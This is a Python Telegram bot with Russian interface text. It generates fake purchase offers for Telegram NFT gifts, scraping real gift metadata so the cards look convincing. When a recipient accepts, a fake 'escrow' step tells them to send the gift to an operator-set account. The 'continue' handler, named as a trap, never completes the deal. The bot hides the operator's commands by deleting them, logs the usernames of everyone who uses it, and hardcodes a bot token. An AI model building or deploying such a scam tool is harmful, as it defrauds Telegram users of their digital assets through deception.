import asyncio
import json
import os
import re
import uuid
import aiohttp
from bs4 import BeautifulSoup
from aiogram import Bot, Dispatcher, F
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton,
    LinkPreviewOptions, InlineQuery, InlineQueryResultArticle, InputTextMessageContent
)

# Токен вашего бота
BOT_TOKEN = "8893848950:AAFsUUybra97f2jiuNuFQlBsAQsrLpTtNdk"

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# Ваш Telegram ID (главный администратор)
SUPER_ADMIN_IDS = [8975317102, 629408999]  

ALL_USERS_FILE = "all_users.json"      # Словарь: {str(user_id): username}
BLOCKED_FILE = "blocked_users.json"    # Список заблокированных ID
CONFIG_FILE = "config.json"

class AdminStates(StatesGroup):
    waiting_for_block_id = State()
    waiting_for_unblock_id = State()
    waiting_for_broadcast_text = State()
    waiting_for_nft_url = State()

# --- Работа с данными ---

def load_all_users() -> dict:
    if os.path.exists(ALL_USERS_FILE):
        try:
            with open(ALL_USERS_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            pass
    return {}

def save_all_users(data: dict):
    with open(ALL_USERS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=4)

def load_json_set(filename: str) -> set:
    if os.path.exists(filename):
        try:
            with open(filename, "r", encoding="utf-8") as f:
                return set(json.load(f))
        except Exception:
            pass
    return set()

def save_json_set(filename: str, data: set):
    with open(filename, "w", encoding="utf-8") as f:
        json.dump(list(data), f, ensure_ascii=False)

def load_config() -> dict:
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            pass
    return {"nft_url": "https://t.me/GiftReseII"}

def save_config(config: dict):
    with open(CONFIG_FILE, "w", encoding="utf-8") as f:
        json.dump(config, f, ensure_ascii=False, indent=4)

all_users = load_all_users()
blocked_users = load_json_set(BLOCKED_FILE)

def register_user(user):
    user_id_str = str(user.id)
    username = f"@{user.username}" if user.username else "нет юзернейма"
    # Сохраняем или обновляем юзернейм
    if user_id_str not in all_users or all_users[user_id_str] != username:
        all_users[user_id_str] = username
        save_all_users(all_users)

def is_blocked(user_id: int) -> bool:
    return user_id in blocked_users

# Кэш для NFT
NFT_CACHE = {}

def normalize_slug(raw_input: str) -> str:
    text = raw_input.strip()
    if "t.me/nft/" in text:
        return text.split("t.me/nft/")[-1].split("?")[0].strip("/")
    if "fragment.com/gift/" in text:
        return text.split("fragment.com/gift/")[-1].split("?")[0].strip("/")
    text = text.replace("#", "-")
    return re.sub(r"\s+", "", text)

def format_fallback_name(slug: str) -> str:
    if "-" in slug:
        parts = slug.split("-")
        raw_name = parts[0]
        num = parts[1]
        spaced_name = re.sub(r"([a-z])([A-Z])", r"\1 \2", raw_name)
        return f"{spaced_name} #{num}"
    return slug

def parse_query_and_price(raw_text: str) -> tuple[str, str, str]:
    tokens = raw_text.strip().split()
    if not tokens:
        return "MirageLamp-44307", "2 727 ⭐️ Звёзд", "2 727 ⭐️"

    nft_parts, price_parts = [], []
    for token in tokens:
        if price_parts or re.match(r"^\d+", token):
            price_parts.append(token)
        else:
            nft_parts.append(token)

    raw_nft = "".join(nft_parts) if nft_parts else tokens[0]
    slug = normalize_slug(raw_nft)

    if not price_parts:
        return slug, "2 727 ⭐️ Звёзд", "2 727 ⭐️"

    price_str = " ".join(price_parts).lower()
    ton_match = re.search(r"(\d+(?:[.,]\d+)?)\s*(?:ton|тон|💎)", price_str)
    star_match = re.search(r"(\d+)\s*(?:star|stars|звезд|звёзд|зв|⭐️|⭐|\*)", price_str)

    if ton_match:
        ton_val = ton_match.group(1)
        return slug, f"{ton_val} 💎 TON", f"{ton_val} TON"

    if star_match:
        star_val = f"{int(star_match.group(1)):,}".replace(",", " ")
        return slug, f"{star_val} ⭐️ Звёзд", f"{star_val} ⭐️"

    only_num = re.search(r"(\d+(?:[.,]\d+)?)", price_str)
    if only_num:
        raw_num = only_num.group(1)
        if raw_num.isdigit():
            val = f"{int(raw_num):,}".replace(",", " ")
        else:
            val = raw_num
    else:
        val = "2 727"
    return slug, f"{val} ⭐️ Звёзд", f"{val} ⭐️"

async def fetch_real_nft_data(slug: str) -> dict:
    if slug in NFT_CACHE:
        return NFT_CACHE[slug]

    url = f"https://t.me/nft/{slug}"
    fallback_data = {
        "slug": slug,
        "url": url,
        "name": format_fallback_name(slug),
        "thumb": "https://telegram.org/img/t_logo.png",
        "model": "Оригинал",
        "backdrop": "Стандарт"
    }

    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
    try:
        timeout = aiohttp.ClientTimeout(total=2.5)
        async with aiohttp.ClientSession(headers=headers, timeout=timeout) as session_http:
            async with session_http.get(url) as resp:
                if resp.status != 200:
                    return fallback_data
                html = await resp.text()

        soup = BeautifulSoup(html, "html.parser")
        title_meta = soup.find("meta", property="og:title")
        image_meta = soup.find("meta", property="og:image")
        if not title_meta or title_meta.get("content") == "Telegram":
            return fallback_data

        details = {}
        for row in soup.find_all("tr"):
            th, td = row.find("th"), row.find("td")
            if th and td:
                details[th.get_text(" ", strip=True).lower()] = td.get_text(" ", strip=True)

        result_data = {
            "slug": slug,
            "url": url,
            "name": title_meta["content"].strip()[:100],
            "thumb": image_meta["content"] if image_meta else fallback_data["thumb"],
            "model": details.get("model", "Стандарт")[:50],
            "backdrop": details.get("backdrop", "Стандарт")[:50],
        }
        NFT_CACHE[slug] = result_data
        return result_data
    except Exception:
        return fallback_data

def format_parsed_card(data: dict, price_display: str) -> str:
    return (
        f"Пользователь предлагает Вам <b>{price_display}</b> за подарок <b><a href='{data['url']}'>{data['name']}</a></b>.\n\n"
        f"Предложение действует ещё 6 ч. 0 мин.."
    )

def get_step1_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="Отклонить", callback_data="decline_offer"),
            InlineKeyboardButton(text="Принять", callback_data="step2_accept")
        ]
    ])

def get_step2_kb() -> InlineKeyboardMarkup:
    config = load_config()
    target_url = config.get("nft_url", "https://t.me/GiftReseII").strip()
    if target_url.startswith("@"):
        target_url = f"https://t.me/{target_url[1:]}"
    elif not target_url.startswith(("http://", "https://", "tg://")):
        target_url = f"https://{target_url}"

    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🎁 Передать NFT", url=target_url)],
        [InlineKeyboardButton(text="➡️ Продолжить", callback_data="explain_continue_btn")]
    ])

# --- Команды пользователя ---

@dp.message(F.text.in_({"/start", "/id"}))
async def cmd_start(message: Message):
    register_user(message.from_user)
    uid = message.from_user.id
    
    if is_blocked(uid):
        await message.answer("❌ <b>Ваш доступ к боту заблокирован администратором.</b>", parse_mode="HTML")
        return

    bot_info = await bot.get_me()
    
    text = (
        "🎁 <b>Генератор интерактивных офферов NFT</b>\n\n"
        f"🔑 Ваш Telegram ID: <code>{uid}</code>\n"
        "✅ <b>Бот полностью бесплатен и доступен для использования!</b>\n\n"
        "⚙️ <b>Как отправить карточку:</b>\n"
        f"1️⃣ <b>Через Инлайн (в любом чате):</b> напишите <code>@{bot_info.username} [ссылка] [цена]</code>\n"
        "2️⃣ <b>Через команду (в группах/бизнесе):</b> напишите <code>/ar [ссылка] [цена]</code>\n"
    )
    if uid in SUPER_ADMIN_IDS:
        text += "\n• <code>/admins</code> — админ-панель"

    await message.answer(text, parse_mode="HTML")

# --- Админ-панель ---

@dp.message(F.text == "/admins")
async def cmd_admins(message: Message, state: FSMContext):
    register_user(message.from_user)
    if message.from_user.id not in SUPER_ADMIN_IDS:
        await message.answer("❌ У вас нет прав администратора.")
        return
        
    total_users = len(all_users)
    blocked_count = len(blocked_users)
    config = load_config()
    current_url = config.get("nft_url", "https://t.me/GiftReseII")
    
    text = (
        f"👑 <b>Админ-панель</b>\n\n"
        f"Всего пользователей: <b>{total_users}</b>\n"
        f"Заблокировано: <b>{blocked_count}</b>\n"
        f"🔗 Ссылка для передачи: <code>{current_url}</code>"
    )
    
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📋 Список пользователей", callback_data="admin_list")],
        [InlineKeyboardButton(text="🔗 Изменить ссылку NFT", callback_data="admin_set_url")],
        [InlineKeyboardButton(text="📢 Рассылка", callback_data="admin_broadcast_start")],
        [
            InlineKeyboardButton(text="🚫 Заблокировать", callback_data="admin_block_start"),
            InlineKeyboardButton(text="✅ Разблокировать", callback_data="admin_unblock_start")
        ]
    ])
    await message.answer(text, parse_mode="HTML", reply_markup=kb)

@dp.callback_query(F.data == "admin_list")
async def cb_admin_list(callback: CallbackQuery):
    if callback.from_user.id not in SUPER_ADMIN_IDS:
        return
    
    if not all_users:
        users_text = "Список пользователей пуст."
    else:
        lines = []
        for uid_str, uname in all_users.items():
            status = " 🔴 [Заблокирован]" if int(uid_str) in blocked_users else ""
            lines.append(f"• {uname} (<code>{uid_str}</code>){status}")
        users_text = "\n".join(lines)
        
        # Telegram ограничивает длину сообщения, если пользователей слишком много
        if len(users_text) > 4000:
            users_text = users_text[:4000] + "\n\n... (список слишком длинный)"

    back_kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back")]
    ])
    await callback.message.edit_text(f"📋 <b>Список пользователей (Юз | ID):</b>\n\n{users_text}", parse_mode="HTML", reply_markup=back_kb)
    await callback.answer()

@dp.callback_query(F.data == "admin_back")
async def cb_admin_back(callback: CallbackQuery, state: FSMContext):
    if callback.from_user.id not in SUPER_ADMIN_IDS:
        return
    await state.clear()
    total_users = len(all_users)
    blocked_count = len(blocked_users)
    config = load_config()
    current_url = config.get("nft_url", "https://t.me/GiftReseII")
    
    text = (
        f"👑 <b>Админ-панель</b>\n\n"
        f"Всего пользователей: <b>{total_users}</b>\n"
        f"Заблокировано: <b>{blocked_count}</b>\n"
        f"🔗 Ссылка для передачи: <code>{current_url}</code>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📋 Список пользователей", callback_data="admin_list")],
        [InlineKeyboardButton(text="🔗 Изменить ссылку NFT", callback_data="admin_set_url")],
        [InlineKeyboardButton(text="📢 Рассылка", callback_data="admin_broadcast_start")],
        [
            InlineKeyboardButton(text="🚫 Заблокировать", callback_data="admin_block_start"),
            InlineKeyboardButton(text="✅ Разблокировать", callback_data="admin_unblock_start")
        ]
    ])
    await callback.message.edit_text(text, parse_mode="HTML", reply_markup=kb)
    await callback.answer()

@dp.callback_query(F.data == "admin_set_url")
async def cb_set_url(callback: CallbackQuery, state: FSMContext):
    if callback.from_user.id not in SUPER_ADMIN_IDS:
        return
    await state.set_state(AdminStates.waiting_for_nft_url)
    config = load_config()
    current_url = config.get("nft_url", "https://t.me/GiftReseII")
    back_kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Отмена", callback_data="admin_back")]])
    await callback.message.edit_text(
        f"🔗 Текущая ссылка: <code>{current_url}</code>\n\n"
        "<b>Отправьте новую ссылку</b>:",
        parse_mode="HTML", reply_markup=back_kb
    )
    await callback.answer()

@dp.callback_query(F.data == "admin_block_start")
async def cb_block_start(callback: CallbackQuery, state: FSMContext):
    if callback.from_user.id not in SUPER_ADMIN_IDS:
        return
    await state.set_state(AdminStates.waiting_for_block_id)
    back_kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Отмена", callback_data="admin_back")]])
    await callback.message.edit_text(
        "🚫 <b>Введите Telegram ID пользователя</b>, которого хотите заблокировать:",
        parse_mode="HTML", reply_markup=back_kb
    )
    await callback.answer()

@dp.callback_query(F.data == "admin_unblock_start")
async def cb_unblock_start(callback: CallbackQuery, state: FSMContext):
    if callback.from_user.id not in SUPER_ADMIN_IDS:
        return
    await state.set_state(AdminStates.waiting_for_unblock_id)
    back_kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Отмена", callback_data="admin_back")]])
    await callback.message.edit_text(
        "✅ <b>Введите Telegram ID пользователя</b>, которого хотите разблокировать:",
        parse_mode="HTML", reply_markup=back_kb
    )
    await callback.answer()

@dp.callback_query(F.data == "admin_broadcast_start")
async def cb_broadcast_start(callback: CallbackQuery, state: FSMContext):
    if callback.from_user.id not in SUPER_ADMIN_IDS:
        return
    await state.set_state(AdminStates.waiting_for_broadcast_text)
    back_kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Отмена", callback_data="admin_back")]])
    await callback.message.edit_text(
        "📢 <b>Введите текст для рассылки всем пользователям бота:</b>",
        parse_mode="HTML", reply_markup=back_kb
    )
    await callback.answer()

@dp.message(AdminStates.waiting_for_nft_url)
async def process_nft_url(message: Message, state: FSMContext):
    if message.from_user.id not in SUPER_ADMIN_IDS:
        return
    new_url = message.text.strip()
    if new_url.startswith("@"):
        new_url = f"https://t.me/{new_url[1:]}"
    elif not new_url.startswith(("http://", "https://", "tg://")):
        new_url = f"https://{new_url}"
    config = load_config()
    config["nft_url"] = new_url
    save_config(config)
    await message.answer(f"✅ Ссылка успешно изменена на:\n<code>{new_url}</code>", parse_mode="HTML")
    await state.clear()

@dp.message(AdminStates.waiting_for_block_id)
async def process_block_id(message: Message, state: FSMContext):
    if message.from_user.id not in SUPER_ADMIN_IDS:
        return
    try:
        target_id = int(message.text.strip())
        if target_id in SUPER_ADMIN_IDS:
            await message.answer("❌ Нельзя заблокировать главного администратора!")
        else:
            blocked_users.add(target_id)
            save_json_set(BLOCKED_FILE, blocked_users)
            await message.answer(f"🚫 Пользователь <code>{target_id}</code> успешно заблокирован.", parse_mode="HTML")
    except ValueError:
        await message.answer("❌ Неверный формат. Введите числовой Telegram ID.")
    await state.clear()

@dp.message(AdminStates.waiting_for_unblock_id)
async def process_unblock_id(message: Message, state: FSMContext):
    if message.from_user.id not in SUPER_ADMIN_IDS:
        return
    try:
        target_id = int(message.text.strip())
        if target_id in blocked_users:
            blocked_users.remove(target_id)
            save_json_set(BLOCKED_FILE, blocked_users)
            await message.answer(f"✅ Пользователь <code>{target_id}</code> разблокирован.", parse_mode="HTML")
        else:
            await message.answer(f"⚠️ Пользователь <code>{target_id}</code> не найден в списке заблокированных.", parse_mode="HTML")
    except ValueError:
        await message.answer("❌ Неверный формат. Введите числовой Telegram ID.")
    await state.clear()

@dp.message(AdminStates.waiting_for_broadcast_text)
async def process_broadcast(message: Message, state: FSMContext):
    if message.from_user.id not in SUPER_ADMIN_IDS:
        return
    broadcast_text = message.text
    await state.clear()
    
    status_msg = await message.answer("⏳ Запуск рассылки...")
    success = 0
    fail = 0
    
    for uid_str in all_users.keys():
        try:
            uid = int(uid_str)
            await bot.send_message(uid, broadcast_text, parse_mode="HTML")
            success += 1
            await asyncio.sleep(0.04)
        except Exception:
            fail += 1
            
    await status_msg.edit_text(
        f"📢 <b>Рассылка завершена!</b>\n\n"
        f"✅ Доставлено: <b>{success}</b>\n"
        f"❌ Ошибок (заблокировали бота): <b>{fail}</b>",
        parse_mode="HTML"
    )

# --- Обработка команд /ar и Inline ---

async def execute_ar_command(message: Message, is_business: bool = False):
    if not message.from_user:
        return

    user_id = message.from_user.id
    register_user(message.from_user)
    
    if is_blocked(user_id):
        return

    text = message.text or ""
    parts = text.split(maxsplit=1)
    raw_args = parts[1].strip() if len(parts) > 1 else "MirageLamp-44307 2727 stars"
    
    slug, price_display, _ = parse_query_and_price(raw_args)
    biz_conn_id = message.business_connection_id if is_business else None

    try:
        if biz_conn_id:
            await bot.delete_business_messages(
                business_connection_id=biz_conn_id,
                message_ids=[message.message_id]
            )
        elif message.chat.type != "private":
            await message.delete()
    except Exception as e:
        print(f"[INFO] Не удалось удалить сообщение: {e}")

    data = await fetch_real_nft_data(slug)

    preview_opts = LinkPreviewOptions(
        is_disabled=False,
        url=data["url"],
        prefer_large_media=True,
        show_above_text=True
    )

    try:
        kwargs = {
            "chat_id": message.chat.id,
            "text": format_parsed_card(data, price_display),
            "parse_mode": "HTML",
            "link_preview_options": preview_opts,
            "reply_markup": get_step1_kb()
        }
        if biz_conn_id:
            kwargs["business_connection_id"] = biz_conn_id

        await bot.send_message(**kwargs)
    except Exception as e:
        print(f"[ERROR] Ошибка отправки карточки: {e}")

@dp.message(F.text.regexp(r"^/ar(\b|@)"))
async def handle_regular_ar(message: Message):
    await execute_ar_command(message, is_business=False)

@dp.business_message(F.text.regexp(r"^/ar(\b|@)"))
async def handle_business_ar(message: Message):
    await execute_ar_command(message, is_business=True)

@dp.inline_query()
async def handle_inline_ar(inline_query: InlineQuery):
    user_id = inline_query.from_user.id
    register_user(inline_query.from_user)
    
    if is_blocked(user_id):
        await inline_query.answer([], switch_pm_text="❌ Ваш доступ заблокирован", switch_pm_parameter="blocked", cache_time=1)
        return

    raw_args = inline_query.query.strip() or "MirageLamp-44307 2727 stars"
    slug, price_display, short_price = parse_query_and_price(raw_args)
    data = await fetch_real_nft_data(slug)

    preview_opts = LinkPreviewOptions(
        is_disabled=False,
        url=data["url"],
        prefer_large_media=True,
        show_above_text=True
    )

    result = InlineQueryResultArticle(
        id=str(uuid.uuid4()),
        title=f"🎁 {data['name']} — {short_price}",
        description=f"Отправить оффер на {price_display}",
        thumbnail_url=data["thumb"],
        input_message_content=InputTextMessageContent(
            message_text=format_parsed_card(data, price_display),
            parse_mode="HTML",
            link_preview_options=preview_opts
        ),
        reply_markup=get_step1_kb()
    )

    await inline_query.answer([result], cache_time=1, is_personal=True)

# --- Кнопки интерфейса ---

@dp.callback_query(F.data == "step2_accept")
async def process_step2(callback: CallbackQuery):
    step2_text = (
        "⏳ <b>Сделка ожидает депонирования подарка</b>\n\n"
        "1. Нажмите <b>«Передать NFT»</b> и отправьте подарок.\n"
        "2. После отправки нажмите <b>«Продолжить»</b>."
    )
    try:
        if callback.inline_message_id:
            await bot.edit_message_text(
                inline_message_id=callback.inline_message_id,
                text=step2_text,
                parse_mode="HTML",
                reply_markup=get_step2_kb()
            )
        elif callback.message:
            await bot.edit_message_text(
                chat_id=callback.message.chat.id,
                message_id=callback.message.message_id,
                business_connection_id=callback.message.business_connection_id,
                text=step2_text,
                parse_mode="HTML",
                reply_markup=get_step2_kb()
            )
    except Exception as e:
        print(f"[ERROR] Ошибка step2: {e}")
    await callback.answer()

@dp.callback_query(F.data == "explain_continue_btn")
async def explain_continue_trap(callback: CallbackQuery):
    await callback.answer(text="⚠️ Подарок еще не найден, подождите...", show_alert=True)

@dp.callback_query(F.data == "decline_offer")
async def process_decline(callback: CallbackQuery):
    declined_text = "❌ <b>Предложение отклонено владельцем</b>"
    try:
        if callback.inline_message_id:
            await bot.edit_message_text(
                inline_message_id=callback.inline_message_id,
                text=declined_text,
                parse_mode="HTML"
            )
        elif callback.message:
            await bot.edit_message_text(
                chat_id=callback.message.chat.id,
                message_id=callback.message.message_id,
                business_connection_id=callback.message.business_connection_id,
                text=declined_text,
                parse_mode="HTML"
            )
    except Exception as e:
        print(f"[ERROR] Ошибка decline: {e}")
    await callback.answer("Оффер отклонен")

async def main():
    await bot.delete_webhook(drop_pending_updates=True)
    bot_info = await bot.get_me()
    print(f"Бот @{bot_info.username} успешно запущен и работает для всех!")
    await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types())

if __name__ == "__main__":
    asyncio.run(main())
